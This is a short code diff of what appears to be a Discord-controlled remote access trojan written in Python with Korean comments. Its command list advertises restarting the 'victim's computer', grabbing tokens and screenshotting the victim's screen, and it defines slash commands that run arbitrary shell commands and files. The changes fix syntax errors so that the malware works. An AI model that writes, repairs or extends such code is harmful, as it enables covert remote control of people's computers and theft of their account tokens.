@@ -21,7 +21,7 @@ commands = "\n".join([  # 명령어 목록
     ">restart - restart victim's computer",
     ">token - grab tokens",
     ">cd - change directory",
-    ">screenshot - took a picture of victim's computer"
+    ">screenshot - took a picture of victim's computer",
     ">exit - exit the program",
 ])
 
@@ -126,7 +126,7 @@ async def execute_ls(context: ApplicationContext):
 
 
 @bot.slash_command(name="shell", description="명령어를 실행합니다.", guild_ids=[guild_id])
-async def execute_command(context: ApplicationContext, command=Option(str, name="명령어", description="실행할 명령어")):
+async def execute_command(context: ApplicationContext, command: Option(str, name="명령어", description="실행할 명령어")):
     await context.response.defer()
     await asyncio.sleep(0)
 
@@ -143,7 +143,7 @@ async def execute_command(context: ApplicationContext, command=Option(str, name=
 
 
 @bot.slash_command(name="run", description="파일을 실행합니다", guild_ids=[guild_id])
-async def run_file(context: ApplicationContext, file=Option(str, name="파일명", description="실행할 파일명")):
+async def run_file(context: ApplicationContext, file: Option(str, name="파일명", description="실행할 파일명")):
     await context.response.defer()
     await asyncio.sleep(0)
 
